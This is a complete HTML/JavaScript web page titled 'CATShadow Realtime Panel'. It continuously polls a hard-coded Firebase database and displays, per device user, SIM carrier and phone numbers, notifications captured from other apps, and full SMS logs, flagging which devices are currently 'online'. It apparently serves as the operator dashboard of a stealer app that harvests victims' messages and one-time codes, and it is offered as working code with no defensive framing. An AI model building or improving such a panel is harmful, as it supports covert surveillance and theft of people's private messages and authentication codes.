<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CATShadow · Realtime Firebase Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0b0e14;
            color: #d4e0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        h1 {
            font-size: 2.2rem;
            font-weight: 400;
            letter-spacing: 2px;
            border-bottom: 2px solid #2a3a4a;
            padding-bottom: 12px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
        }
        h1 .badge-group {
            display: flex;
            align-items: center;
            gap: 18px;
            flex-wrap: wrap;
            font-size: 1rem;
        }
        h1 .badge-group small {
            color: #7a9ab5;
            background: #1a2530;
            padding: 6px 16px;
            border-radius: 30px;
        }
        h1 .badge-group .online-badge {
            color: #7fdb9a;
            background: #1a2a22;
            padding: 6px 16px;
            border-radius: 30px;
            border: 1px solid #2a5a3a;
        }
        .panel-grid {
            display: grid;
            grid-template-columns: 320px 1fr;
            gap: 24px;
            height: calc(100vh - 140px);
        }
        .user-list {
            background: #131b24;
            border-radius: 12px;
            padding: 16px 8px 8px 16px;
            overflow-y: auto;
            border: 1px solid #253544;
            display: flex;
            flex-direction: column;
        }
        .user-list .controls {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 12px;
        }
        .user-list .controls input {
            flex: 1;
            min-width: 120px;
            background: #0f171f;
            border: 1px solid #2d4050;
            color: #d4e0f0;
            padding: 10px 14px;
            border-radius: 30px;
            font-family: inherit;
            font-size: 0.9rem;
            outline: none;
        }
        .user-list .controls input:focus {
            border-color: #4a7a9c;
        }
        .user-list .controls .toggle-online {
            background: #1a2530;
            border: 1px solid #2d4050;
            color: #b0c8dd;
            padding: 8px 16px;
            border-radius: 30px;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.85rem;
            transition: 0.2s;
            white-space: nowrap;
        }
        .user-list .controls .toggle-online.active {
            background: #1a3a2a;
            border-color: #4a9a6a;
            color: #7fdb9a;
        }
        .user-list .controls .toggle-online:hover {
            background: #1f3140;
        }
        .user-counts {
            display: flex;
            justify-content: space-between;
            font-size: 0.75rem;
            color: #6a8aa5;
            padding: 0 14px 12px 14px;
            border-bottom: 1px solid #1f2e3a;
            margin-bottom: 12px;
        }
        .user-item {
            padding: 8px 14px;
            margin-bottom: 4px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: 0.15s;
            border-left: 3px solid transparent;
            word-break: break-all;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .user-item:hover {
            background: #1d2a36;
            border-left-color: #5a8aaa;
        }
        .user-item.active {
            background: #1f3140;
            border-left-color: #8fcbff;
            color: #b6defa;
        }
        .user-item .online-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #2a4a3a;
            margin-left: 8px;
            flex-shrink: 0;
        }
        .user-item .online-dot.online {
            background: #4fdb7a;
            box-shadow: 0 0 8px #4fdb7a66;
        }
        .detail-panel {
            background: #131b24;
            border-radius: 12px;
            padding: 20px;
            overflow-y: auto;
            border: 1px solid #253544;
        }
        .detail-panel h2 {
            font-size: 1.3rem;
            font-weight: 400;
            color: #b0d0ea;
            margin-bottom: 6px;
        }
        .detail-panel .sub {
            color: #6a8aa5;
            font-size: 0.8rem;
            margin-bottom: 20px;
            border-bottom: 1px solid #1f2e3a;
            padding-bottom: 12px;
        }
        .section-title {
            font-size: 1.1rem;
            font-weight: 400;
            color: #8ab4d8;
            margin: 24px 0 12px 0;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .section-title span {
            background: #1f3140;
            padding: 2px 14px;
            border-radius: 30px;
            font-size: 0.75rem;
            color: #7a9ab5;
        }
        .card {
            background: #0f171f;
            border-radius: 8px;
            padding: 14px 18px;
            margin-bottom: 10px;
            border-left: 4px solid #2d4a5e;
        }
        .card .head {
            display: flex;
            justify-content: space-between;
            color: #8ab4d8;
            font-size: 0.8rem;
            margin-bottom: 4px;
        }
        .card .head .app {
            background: #1a2530;
            padding: 0 10px;
            border-radius: 30px;
        }
        .card .msg {
            font-size: 0.9rem;
            white-space: pre-wrap;
            word-break: break-word;
            max-height: 80px;
            overflow-y: auto;
            color: #c8dae8;
        }
        .card .timestamp {
            font-size: 0.7rem;
            color: #5a7a95;
            margin-top: 6px;
            text-align: right;
        }
        .sms-card {
            border-left-color: #7a8a5a;
        }
        .sms-card .head .sender {
            background: #1a2a1a;
            padding: 0 10px;
            border-radius: 30px;
        }
        .sim-info {
            background: #0f171f;
            padding: 14px 18px;
            border-radius: 8px;
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
            border: 1px solid #253544;
        }
        .sim-info div {
            font-size: 0.9rem;
        }
        .sim-info strong {
            color: #8ab4d8;
            margin-right: 8px;
        }
        .empty {
            color: #5a7a95;
            text-align: center;
            padding: 40px 0;
            font-style: italic;
        }
        .status-bar {
            font-size: 0.7rem;
            color: #4a6a85;
            padding: 6px 0 0 0;
            text-align: right;
            border-top: 1px solid #1a2530;
            margin-top: 8px;
        }
        .status-bar .scan-progress {
            color: #7a9ab5;
        }
        ::-webkit-scrollbar {
            width: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #0b0e14;
        }
        ::-webkit-scrollbar-thumb {
            background: #2d4050;
            border-radius: 10px;
        }
        @media (max-width: 800px) {
            .panel-grid {
                grid-template-columns: 1fr;
                height: auto;
            }
            .user-list {
                max-height: 350px;
            }
            .detail-panel {
                max-height: 600px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>
        🐟 CATShadow · Realtime Panel
        <span class="badge-group">
            <small id="totalUsers">⏳ loading…</small>
            <span class="online-badge" id="onlineCount">🟢 0 online</span>
        </span>
    </h1>
    <div class="panel-grid">
        <!-- LEFT -->
        <div class="user-list" id="userListContainer">
            <div class="controls">
                <input type="text" id="searchInput" placeholder="🔍 filter users…" oninput="filterUsers()">
                <button class="toggle-online" id="onlineToggle" onclick="toggleOnlineFilter()">🟢 Online Only</button>
            </div>
            <div class="user-counts">
                <span id="userCount">0 users</span>
                <span id="lastRefresh">⏱️ now</span>
            </div>
            <div id="userItems" style="flex:1; overflow-y:auto;"></div>
            <div class="status-bar">
                <span id="scanStatus">⚡ scanning all users…</span>
            </div>
        </div>

        <!-- RIGHT -->
        <div class="detail-panel" id="detailPanel">
            <h2>👤 Select a user</h2>
            <div class="sub">click any user from the left to load their full data</div>
            <div id="detailContent">
                <div class="empty">awaiting your command, Butter.</div>
            </div>
        </div>
    </div>
</div>

<script>
    (function() {
        // ---- CONFIG ----
        const BASE_URL = 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app';
        const USER_LIST_URL = `${BASE_URL}/users.json?shallow=true`;
        const USER_DETAIL_URL = (uid) => `${BASE_URL}/users/${uid}.json`;
        const REFRESH_MS = 5000; // 5 seconds
        const ONLINE_WINDOW_MS = 120000; // 2 minutes
        const MAX_CONCURRENT_FETCHES = 15; // fetch 15 users simultaneously

        // ---- STATE ----
        let allUserIds = [];
        let filteredIds = [];
        let currentUid = null;
        let currentData = null;
        let onlineOnly = false;
        let onlineSet = new Set();
        let userDataCache = new Map(); // uid -> full data
        let refreshTimer = null;
        let isScanning = false;

        // ---- DOM refs ----
        const userItemsEl = document.getElementById('userItems');
        const searchInput = document.getElementById('searchInput');
        const userCountEl = document.getElementById('userCount');
        const totalUsersEl = document.getElementById('totalUsers');
        const onlineCountEl = document.getElementById('onlineCount');
        const detailContent = document.getElementById('detailContent');
        const detailPanel = document.getElementById('detailPanel');
        const onlineToggle = document.getElementById('onlineToggle');
        const lastRefreshEl = document.getElementById('lastRefresh');
        const scanStatusEl = document.getElementById('scanStatus');

        // ---- HELPERS ----
        function formatTimestamp(ts) {
            if (!ts) return '—';
            const d = new Date(ts);
            return d.toLocaleString('en-IN', { hour12: true, day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
        }

        function formatTimestampMs(ms) {
            if (!ms) return '—';
            return formatTimestamp(ms);
        }

        // ---- ONLINE DETECTION ----
        function isUserOnline(data) {
            if (!data) return false;
            const now = Date.now();
            // Check notifications
            if (data.notifications) {
                for (const key in data.notifications) {
                    const ts = data.notifications[key].timestamp;
                    if (ts) {
                        const d = new Date(ts).getTime();
                        if (!isNaN(d) && (now - d) < ONLINE_WINDOW_MS) return true;
                    }
                }
            }
            // Check SMS logs
            if (data.sms_logs) {
                for (const key in data.sms_logs) {
                    const ts = data.sms_logs[key].timestamp;
                    if (ts && typeof ts === 'number' && (now - ts) < ONLINE_WINDOW_MS) return true;
                }
            }
            return false;
        }

        // ---- FETCH SINGLE USER DETAIL ----
        function fetchUserDetail(uid) {
            return fetch(USER_DETAIL_URL(uid))
                .then(res => res.json())
                .then(data => {
                    userDataCache.set(uid, data);
                    const online = isUserOnline(data);
                    if (online) onlineSet.add(uid);
                    else onlineSet.delete(uid);
                    return { uid, data, online };
                })
                .catch(() => {
                    return { uid, data: null, online: false };
                });
        }

        // ---- SCAN ALL USERS (with concurrency control) ----
        async function scanAllUsers() {
            if (isScanning) return;
            isScanning = true;
            scanStatusEl.textContent = '⏳ scanning all users…';

            const uids = allUserIds;
            const chunks = [];
            for (let i = 0; i < uids.length; i += MAX_CONCURRENT_FETCHES) {
                chunks.push(uids.slice(i, i + MAX_CONCURRENT_FETCHES));
            }

            let processed = 0;
            for (const chunk of chunks) {
                const promises = chunk.map(uid => fetchUserDetail(uid));
                await Promise.all(promises);
                processed += chunk.length;
                scanStatusEl.textContent = `⏳ scanning ${processed}/${uids.length} users…`;
                // Update UI periodically during scan
                if (processed % 50 === 0 || processed === uids.length) {
                    updateOnlineBadge();
                    renderUserList();
                }
            }

            isScanning = false;
            scanStatusEl.textContent = `✅ scanned ${uids.length} users`;
            updateOnlineBadge();
            renderUserList();
            lastRefreshEl.textContent = `⏱️ ${new Date().toLocaleTimeString()}`;
        }

        // ---- UPDATE ONLINE BADGE ----
        function updateOnlineBadge() {
            const count = onlineSet.size;
            onlineCountEl.textContent = `🟢 ${count} online`;
        }

        // ---- RENDER USER LIST ----
        function renderUserList() {
            const search = searchInput.value.toLowerCase().trim();
            let workingIds = allUserIds;
            if (onlineOnly) {
                workingIds = allUserIds.filter(uid => onlineSet.has(uid));
            }
            filteredIds = workingIds.filter(id => id.toLowerCase().includes(search));
            userCountEl.textContent = `${filteredIds.length} user${filteredIds.length !== 1 ? 's' : ''} ${onlineOnly ? '(online)' : '(all)'}`;
            totalUsersEl.textContent = `📦 ${allUserIds.length} total`;
            updateOnlineBadge();

            if (filteredIds.length === 0) {
                userItemsEl.innerHTML = `<div class="empty" style="padding:20px 0;">no matching users</div>`;
                return;
            }

            let html = '';
            filteredIds.forEach(uid => {
                const active = (uid === currentUid) ? 'active' : '';
                const isOnline = onlineSet.has(uid);
                const dotClass = isOnline ? 'online' : '';
                html += `<div class="user-item ${active}" data-uid="${uid}" onclick="loadUser('${uid}')">
                    <span>${uid}</span>
                    <span class="online-dot ${dotClass}"></span>
                </div>`;
            });
            userItemsEl.innerHTML = html;

            // If current user is still in list, keep them selected
            if (currentUid && filteredIds.includes(currentUid)) {
                const target = document.querySelector(`.user-item[data-uid="${currentUid}"]`);
                if (target) target.classList.add('active');
            }
        }

        // ---- LOAD USER DETAIL ----
        window.loadUser = function(uid) {
            if (uid === currentUid && currentData) {
                renderDetail(currentData, uid);
                return;
            }
            currentUid = uid;
            // highlight in list
            document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
            const target = document.querySelector(`.user-item[data-uid="${uid}"]`);
            if (target) target.classList.add('active');

            // Check if we have cached data
            if (userDataCache.has(uid)) {
                const data = userDataCache.get(uid);
                currentData = data;
                renderDetail(data, uid);
                return;
            }

            detailContent.innerHTML = `<div class="empty">⏳ loading ${uid}…</div>`;
            fetch(USER_DETAIL_URL(uid))
                .then(res => res.json())
                .then(data => {
                    userDataCache.set(uid, data);
                    currentData = data;
                    const online = isUserOnline(data);
                    if (online) onlineSet.add(uid);
                    else onlineSet.delete(uid);
                    updateOnlineBadge();
                    renderUserList();
                    renderDetail(data, uid);
                })
                .catch(err => {
                    detailContent.innerHTML = `<div class="empty">⚠️ error loading user: ${err.message}</div>`;
                });
        };

        // ---- RENDER DETAIL ----
        function renderDetail(data, uid) {
            if (!data) {
                detailContent.innerHTML = `<div class="empty">⚠️ no data for this user</div>`;
                return;
            }

            let html = `<h2>🔑 ${uid}</h2><div class="sub">full record</div>`;

            // ---- SIM INFO ----
            if (data.simInfo) {
                const sim = data.simInfo;
                let simHtml = `<div class="section-title">📱 SIM Info</div><div class="sim-info">`;
                if (sim.sim0) {
                    simHtml += `<div><strong>SIM0:</strong> ${sim.sim0.carrierName || '—'} · ${sim.sim0.number || '—'} (slot ${sim.sim0.slotIndex ?? '?'})</div>`;
                }
                if (sim.sim1) {
                    simHtml += `<div><strong>SIM1:</strong> ${sim.sim1.carrierName || '—'} · ${sim.sim1.number || '—'} (slot ${sim.sim1.slotIndex ?? '?'})</div>`;
                }
                simHtml += `</div>`;
                html += simHtml;
            }

            // ---- NOTIFICATIONS ----
            if (data.notifications) {
                const keys = Object.keys(data.notifications);
                html += `<div class="section-title">🔔 Notifications <span>${keys.length}</span></div>`;
                if (keys.length === 0) {
                    html += `<div class="empty" style="padding:8px 0;">no notifications</div>`;
                } else {
                    const sorted = keys.sort((a, b) => {
                        const ta = data.notifications[a].timestamp || '';
                        const tb = data.notifications[b].timestamp || '';
                        return tb.localeCompare(ta);
                    });
                    sorted.forEach(key => {
                        const n = data.notifications[key];
                        html += `<div class="card">
                            <div class="head">
                                <span>${n.title || '📩'}</span>
                                <span class="app">${n.app || 'app'}</span>
                            </div>
                            <div class="msg">${n.message || ''}</div>
                            <div class="timestamp">${n.timestamp || '—'}</div>
                        </div>`;
                    });
                }
            }

            // ---- SMS LOGS ----
            if (data.sms_logs) {
                const keys = Object.keys(data.sms_logs);
                html += `<div class="section-title">✉️ SMS Logs <span>${keys.length}</span></div>`;
                if (keys.length === 0) {
                    html += `<div class="empty" style="padding:8px 0;">no SMS logs</div>`;
                } else {
                    const sorted = keys.sort((a, b) => {
                        const ta = data.sms_logs[a].timestamp || 0;
                        const tb = data.sms_logs[b].timestamp || 0;
                        return tb - ta;
                    });
                    sorted.forEach(key => {
                        const sms = data.sms_logs[key];
                        html += `<div class="card sms-card">
                            <div class="head">
                                <span>📨 from ${sms.sender || 'unknown'}</span>
                                <span class="sender">${sms.sender || '—'}</span>
                            </div>
                            <div class="msg">${sms.message || ''}</div>
                            <div class="timestamp">${sms.timestamp ? formatTimestampMs(sms.timestamp) : '—'}</div>
                        </div>`;
                    });
                }
            }

            if (!data.notifications && !data.sms_logs && !data.simInfo) {
                html += `<div class="empty">no structured data found for this user</div>`;
            }

            detailContent.innerHTML = html;
        }

        // ---- FILTER ----
        window.filterUsers = function() {
            renderUserList();
            if (currentUid && !filteredIds.includes(currentUid)) {
                currentUid = null;
                currentData = null;
                detailContent.innerHTML = `<div class="empty">user filtered out — select another</div>`;
            }
        };

        // ---- TOGGLE ONLINE FILTER ----
        window.toggleOnlineFilter = function() {
            onlineOnly = !onlineOnly;
            onlineToggle.classList.toggle('active', onlineOnly);
            renderUserList();
        };

        // ---- FETCH USER LIST ----
        function fetchUserList() {
            fetch(USER_LIST_URL)
                .then(res => res.json())
                .then(data => {
                    if (data && typeof data === 'object') {
                        const newUserIds = Object.keys(data);
                        // Check if list changed
                        const changed = newUserIds.length !== allUserIds.length || 
                                       newUserIds.some(id => !allUserIds.includes(id));
                        if (changed) {
                            allUserIds = newUserIds;
                            // Reset cache for users that no longer exist
                            for (const uid of userDataCache.keys()) {
                                if (!allUserIds.includes(uid)) {
                                    userDataCache.delete(uid);
                                    onlineSet.delete(uid);
                                }
                            }
                            renderUserList();
                            // Start fresh scan
                            scanAllUsers();
                        } else {
                            // Just refresh online status for all cached users
                            let anyChanged = false;
                            for (const [uid, data] of userDataCache) {
                                const wasOnline = onlineSet.has(uid);
                                const nowOnline = isUserOnline(data);
                                if (wasOnline !== nowOnline) {
                                    if (nowOnline) onlineSet.add(uid);
                                    else onlineSet.delete(uid);
                                    anyChanged = true;
                                }
                            }
                            if (anyChanged) {
                                updateOnlineBadge();
                                renderUserList();
                            }
                            // Also scan any users we haven't cached yet
                            const uncached = allUserIds.filter(uid => !userDataCache.has(uid));
                            if (uncached.length > 0) {
                                scanAllUsers();
                            }
                        }
                    } else {
                        allUserIds = [];
                    }
                    lastRefreshEl.textContent = `⏱️ ${new Date().toLocaleTimeString()}`;
                })
                .catch(err => {
                    userItemsEl.innerHTML = `<div class="empty">⚠️ failed to fetch user list: ${err.message}</div>`;
                    totalUsersEl.textContent = '⚠️ error';
                });
        }

        // ---- INIT ----
        // First fetch and scan
        fetchUserList();

        // Set up auto-refresh
        refreshTimer = setInterval(() => {
            fetchUserList();
        }, REFRESH_MS);

        // Also re-scan all users every 30 seconds to update online status
        setInterval(() => {
            if (allUserIds.length > 0) {
                scanAllUsers();
            }
        }, 30000);

        // Expose scan function to console for manual trigger
        window.scanAllUsers = scanAllUsers;
    })();
</script>
</body>
</html>
